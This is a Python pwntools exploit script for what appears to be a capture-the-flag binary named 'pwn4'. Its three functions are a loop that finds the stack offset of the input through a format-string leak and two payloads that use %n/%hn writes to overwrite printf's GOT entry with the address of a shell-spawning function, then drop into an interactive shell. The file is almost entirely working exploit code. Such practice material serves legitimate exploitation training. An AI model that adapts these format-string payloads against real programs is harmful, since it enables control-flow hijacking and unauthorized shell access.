from pwn import *

#p = process("./pwn4")

def offset_finder():
    # By using this function we can find out that our input is stored at offset seven of the stack
    for x in range (1, 101):
        p = process("./pwn4")
        p.recvuntil("Do you swear to use this shell with responsility by the old gods and the new?\n")
        print "Offset number {}".format(x)

        payload = ""
        payload += "A" * 4
        payload += "%{}$p".format(x)
        p.sendline(payload)
        p.recvuntil("AAAA")
        stack_value = p.recvline()[:-1]
        if stack_value.find("4141") != -1:
            print "Offset found!"
            print "Stack value: {}".format(stack_value)
            break
        else:
            print "Stack value: {}".format(stack_value)
            
        p.close()

def fromLiveOverflow():
    p = process("./pwn4")

    shell = 0x0804853d
    printf = 0x80498fc

    payload = ""
    payload += p32(printf)
    payload += p32(printf + 2)
    payload += "BBBBCCCC"
    payload += "%7$34093x"
    payload += "%7$n"
    payload += "%33479x"
    payload += "%8$n"

    #gdb.attach(p, """
    #            b *main+83
    #            b *main+95
    #            c
    #            """)

    p.sendline(payload)
    p.interactive()

def myFriendPayload():
    p = process("./pwn4")
    binary = ELF("pwn4")
    shell = 0x0804853d
    printf_got = binary.symbols["got.printf"]
    log.info("Printf@got : 0x{0:x}".format(printf_got))
    #gdb.attach(p, """
    #            b *main+108
    #            b *main+115
    #            c
    #            """)
    payload = ""
    payload += p32(printf_got)
    payload += p32(printf_got + 2)
    payload += "%7${}p%7$hn".format(0x853d - len(payload))
    print payload
    payload += "%8${}p%8$hn".format(0x10804 - 0x853d)
    print payload
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    fromLiveOverflow()
    #myFriendPayload()
    #offset_finder()